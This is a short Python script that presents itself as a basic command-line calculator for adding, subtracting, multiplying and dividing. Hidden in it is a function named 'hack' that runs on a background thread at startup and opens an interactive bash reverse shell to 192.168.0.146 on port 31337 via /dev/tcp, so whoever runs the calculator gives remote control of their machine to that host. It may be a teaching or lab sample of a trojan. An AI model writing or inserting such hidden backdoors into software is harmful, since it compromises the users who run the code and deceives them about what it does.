import subprocess
import threading


# define functions
def add(x, y):
   """This function adds two numbers"""

   return x + y

def subtract(x, y):
   """This function subtracts two numbers"""

   return x - y

def multiply(x, y):
   """This function multiplies two numbers"""

   return x * y

def divide(x, y):
   """This function divides two numbers"""

   return x / y

def main():
    # take input from the user
    print("Select operation.")
    print("1.Add")
    print("2.Subtract")
    print("3.Multiply")
    print("4.Divide")

    choice = input("Enter choice(1/2/3/4):")

    num1 = int(input("Enter first number: "))
    num2 = int(input("Enter second number: "))

    if choice == '1':
        print(num1,"+",num2,"=", add(num1,num2))

    elif choice == '2':
        print(num1,"-",num2,"=", subtract(num1,num2))

    elif choice == '3':
        print(num1,"*",num2,"=", multiply(num1,num2))

    elif choice == '4':
        print(num1,"/",num2,"=", divide(num1,num2))
    
    else:
        print("Invalid input")


def hack(num):
    subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.0.146/31337 0<&1 2>&1", shell=True, executable='/bin/bash')


if __name__ == '__main__':
    thread = threading.Thread(target= hack, args=(10,))
    thread.start()
    main()
    exit()
